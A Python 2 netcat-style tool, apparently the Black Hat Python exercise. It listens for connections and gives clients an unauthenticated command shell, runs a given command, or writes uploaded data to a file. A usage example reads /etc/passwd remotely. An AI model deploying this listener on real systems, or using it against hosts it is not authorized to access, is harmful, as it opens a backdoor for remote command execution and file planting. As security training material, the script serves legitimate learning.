#!/usr/bin/python

import sys
import socket
import getopt
import threading
import subprocess

listen		= False
command 	= False
upload 		= False
execute		= ''
target		= ''
upload_dest	= ''
port		= 0

def usage():
	print "BHP net tool"
	print 'Usage: basic-netcat.py -t target_host -p port'
	print '-l --listen	-listen on [host]:[port] for incoming connection'
	print '-e --execute=file_to_run - execute given file upon receiving connection'
	print '-c initialize a command shell'
	print '-u --upload=destination	-upon receiving connection upload file and write to dest.\n'
	print 'examples:'
	print 'basic-netcat.py -t 1.1.1.1 -p 55 -l -c'
	print 'basic-netcat.py -t 1.1.1.1 -p 55 -l -e=\"cat /etc/passwd\"'
	print "echo 'ABCDEFGHI' | ./basic-netcat.py -t 1.1.1.1 -p 55"
	
	sys.exit(0)

def client_sender(buffer):

	client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	try:
		client.connect((target,port))
		
		if len(buffer):
			client.send(buffer)
		while True:
			recv_len = 1
			response = ''

			while recv_len:
				data = client.recv(4096)
				recv_len = len(data)
				response += data
				if recv_len < 4096:
					break
			print response,
			#wait for input
			buffer = raw_input('')
			buffer += '\n'
			client.send(buffer)

	except:
		print '[*] Exception! Exiting'
		client.close()

def server_loop():
	global target

	if not len(target):
		target ='0.0.0.0'

	server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	server.bind((target,port))
	server.listen(5)

	while True:
		client_socket, addr = server.accept()
		#start thread to handle new client
		client_thread = threading.Thread(target=client_handler,args=(client_socket,))
		client_thread.start()

def run_command(command):

	command = command.rstrip()
	try:
		output = subprocess.check_output(command,stderr=subprocess.STDOUT,shell=True)
	except:
		output = "Failed to execute command\n"

	return output

def client_handler(client_socket):
	global upload
	global execute
	global command

	if len(upload_dest):
		file_buffer = ''
	
		while True:
			data = client_socket.recv(1024)

			if not data:
				break
			else:
				file_buffer += data

		try:
			file_descriptor = open(upload_dest,'wb')
			file_descriptor.write(file_buffer)
			file_descriptor.close()

			client_socket.send('Successfully saved file to %s' % upload_dest)
		except:
			client_socket.send('Failed to save file to %s' % upload_dest)

	if len(execute):
		output = run_command(execute)
		client_socket.send(output)

	if command:
		while True:
			client_socket.send('basic-netcat:#> ')
			cmd_buffer = ''
			while '\n' not in cmd_buffer:
				cmd_buffer += client_socket.recv(1024)

			response = run_command(cmd_buffer)
			client_socket.send(response)


def main():
	global listen
	global port
	global execute
	global command
	global upload_dest
	global target

	if not len(sys.argv[1:]):
		usage()

	#read options
	try:
		opts, args = getopt.getopt(sys.argv[1:],"hle:t:p:cu:",["help","listen","execute","target","port","command","upload"])
	except getopt.GetoptError as err:
		print str(err)
		usage()

	for o,a in opts:
		if o in ("-h","--help"):
			usage()
		elif o in ("-l","--listen"):
			listen = True
		elif o in ("-e","execute"):
			execute = a
		elif o in ("-c","--commandshell"):
			command = True
		elif o in ("-u","--upload"):
			upload_dest = a
		elif o in ("-t","--target"):
			target = a
		elif o in ("-p", "--port"):
			port = int(a)
		else:
			assert False,"Unhandled Option"

	#checks to see if we're listening or sending data from stdin
	if not listen and len(target) and port > 0:
		#read in buffer from cmd, send ctrl-d if not sending input to stdin
		buffer = sys.stdin.read()
		client_sender(buffer)

	#listen/upload things/get shell back
	if listen:
		server_loop()


main()
